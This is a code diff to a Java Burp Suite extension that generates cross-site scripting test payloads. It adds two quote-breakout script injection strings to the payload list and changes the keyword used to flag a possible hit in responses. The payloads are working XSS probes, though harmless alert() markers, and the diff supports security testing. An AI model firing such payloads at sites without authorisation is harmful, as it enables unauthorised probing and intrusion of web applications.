@@ -34,6 +34,8 @@ public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayl
      */
 	public static final byte[][] PAYLOADS = {
 		"<script>alert('f7sdgfjFpoG')</script>".getBytes(),
+		"\"><script>alert('f7sdgfjFpoG')</script>".getBytes(),
+		"'><script>alert('f7sdgfjFpoG')</script>".getBytes(),
 		"<SCRIPT>alert('f7sdgfjFpoG');</SCRIPT>".getBytes(),
 		"'';!--\"<f7sdgfjFpoG>=&{()}".getBytes(),
 		"<IMG SRC=\"javascript:alert('f7sdgfjFpoG');\">".getBytes(),
@@ -150,7 +152,7 @@ public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayl
             	stdout.println("Response: " + responseAsString);
             	
 	            // parse response for XSS
-	            if(responseAsString.contains("message")) {
+	            if(responseAsString.contains("found")) {
 	            	// Append weird string to identify XSS
 		            String newResponse = helpers.bytesToString(messageInfo.getResponse()) + "fy7sdufsuidfhuisdf";
 	            	messageInfo.setResponse(helpers.stringToBytes(newResponse));
